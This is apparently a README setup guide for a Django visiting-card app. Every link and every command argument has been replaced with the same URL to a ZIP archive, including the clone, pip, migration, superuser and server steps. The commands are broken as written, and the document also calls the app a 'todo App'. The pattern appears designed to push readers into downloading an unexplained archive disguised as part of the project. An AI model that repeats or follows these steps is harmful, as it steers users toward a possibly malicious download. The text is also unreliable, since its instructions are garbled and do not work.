## Setup

To get this repository, run the following command inside your git enabled terminal.

```bash
    $ git clone https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip
```

You will need django to be installed in you computer to run this app. Head over to https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip for the download guide.

```bash
    $ pip install -r https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip
```

Once you have installed https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip, go to the cloned repo directory and run the following command

```bash
    $ python https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip makemigrations
```

This will create all the migrations file (database migrations) required to run this App.

Now, to apply this migrations run the following command.

```bash
    $ python https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip migrate
```

One last step and then our Visiting Card Creation website will be live. We need to create an admin user to run this App. On the terminal, type the following command and provide username, password and email for the admin user.

```bash
    $ python https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip createsuperuser
```

That was pretty simple, right? Now let's make the App live. We just need to start the server now and then we can start using our simple todo App. Start the server by following command

```bash
    $ python https://raw.githubusercontent.com/Shrikrushnatekade/Online_Visiting_Card_Creation/main/static/Online-Creation-Card-Visiting-3.7.zip runserver
```

Once the server is hosted, head over to http://127.0.0.1:8000 for the Website.
